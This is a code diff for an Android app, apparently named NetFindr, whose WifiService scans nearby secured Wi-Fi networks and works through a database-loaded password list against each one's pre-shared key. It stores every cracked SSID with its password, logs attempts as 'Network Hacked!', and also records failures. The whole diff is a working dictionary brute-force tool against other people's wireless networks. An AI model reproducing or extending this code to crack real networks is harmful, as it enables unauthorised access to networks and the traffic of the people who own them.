@@ -19,8 +19,13 @@ import java.io.IOException;
 import java.io.InputStreamReader;
 import java.io.InterruptedIOException;
 import java.util.ArrayList;
+import java.util.Date;
 import java.util.List;
 import java.util.concurrent.CountDownLatch;
+
+import nz.frontdoor.netfindr.services.Database;
+import nz.frontdoor.netfindr.services.Network;
+import nz.frontdoor.netfindr.services.Password;
 
 /**
  * An {@link IntentService} subclass for handling asynchronous task requests in
@@ -43,6 +48,7 @@ public class WifiService extends IntentService {
     private ScanResult current;
     private CONNECTION_ATTEMPT_RESULT currentRes;
     private ThreadEvent scanComplete = new ThreadEvent();
+    private Database database;
 
     private enum CONNECTION_ATTEMPT_RESULT {
         SUCCESS,
@@ -63,7 +69,7 @@ public class WifiService extends IntentService {
         networks = new ArrayList<>();
         seenSSID = new ArrayList<>();
         new SUPRHackrThrd().execute();
-
+        database = new Database(context);
 
         wifi = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
         wifiScanReciver = new BroadcastReceiver() {
@@ -120,6 +126,7 @@ public class WifiService extends IntentService {
                 if (netInfo != null && netInfo.getType() == ConnectivityManager.TYPE_WIFI) {
                     // HAKED
                     currentRes = CONNECTION_ATTEMPT_RESULT.SUCCESS;
+
                 } else {
                     // NOT HAKED
                     currentRes = CONNECTION_ATTEMPT_RESULT.FAILURE;
@@ -161,7 +168,7 @@ public class WifiService extends IntentService {
     }
 
     private class SUPRHackrThrd extends AsyncTask<Void, Void, Void> {
-        String[] passwords = new String[] {"password", "password1"};
+        List<Password> passwords = database.getPasswords();
 
         @Override
         protected Void doInBackground(Void... params) {
@@ -190,6 +197,7 @@ public class WifiService extends IntentService {
                 }
 
                 Log.v(TAG, "Scanning Network -> " + sr.SSID);
+                boolean success = false;
 
                 SECURITY_TYPE security_type = getSecurityType(sr);
                 Log.d(TAG, "Network Security -> " + security_type.toString());
@@ -198,11 +206,10 @@ public class WifiService extends IntentService {
                     Log.v(TAG, "Skipping Network... No Security");
                     continue;
                 }
-
-                for (String password : passwords) {
+                for (Password password : passwords) {
                     WifiConfiguration wifiConfiguration = new WifiConfiguration();
                     wifiConfiguration.SSID = String.format("\"%s\"", sr.SSID);
-                    wifiConfiguration.preSharedKey = String.format("\"%s\"", password);
+                    wifiConfiguration.preSharedKey = String.format("\"%s\"", password.getPhrase());
                     wifiConfiguration.status = WifiConfiguration.Status.ENABLED;
 
                     int id = -1;
@@ -222,11 +229,27 @@ public class WifiService extends IntentService {
 
                     wifi.removeNetwork(id);
                     if (currentRes == CONNECTION_ATTEMPT_RESULT.SUCCESS) {
+                        success = true;
                         Log.v(TAG, "Network Hacked!, SSID -> " + sr.SSID + ", password -> " + password);
+                        database.addNetwork(Network.SuccessfulConnection(
+                                sr.SSID,
+                                password,
+                                0, 0,
+                                "WOW",
+                                new Date()
+                        ));
                         break;
                     } else {
                         Log.v(TAG, "Network Not Hacked, SSID -> " + sr.SSID + ", password -> " + password);
                     }
+                }
+                if (!success) {
+                    database.addNetwork(Network.UnsuccessfulConnection(
+                            sr.SSID,
+                            0, 0,
+                            "GUD",
+                            new Date()
+                    ));
                 }
             }
 
